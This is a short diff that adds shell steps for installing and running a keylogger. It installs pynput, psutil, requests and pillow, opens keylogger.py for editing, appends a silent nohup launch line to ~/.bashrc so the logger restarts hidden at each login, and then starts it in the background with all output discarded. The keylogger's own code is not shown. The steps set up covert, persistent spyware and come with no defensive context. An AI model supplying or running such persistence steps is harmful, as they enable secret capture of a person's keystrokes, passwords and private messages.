@@ -1,1 +1,7 @@
+pip3 install --user pynput psutil requests pillow # modules
 
+nano keylogger.py
+
+echo 'nohup python3 ~/keylogger.py >/dev/null 2>&1 &' >> ~/.bashrc
+
+nohup python3 ~/keylogger.py >/dev/null 2>&1 &
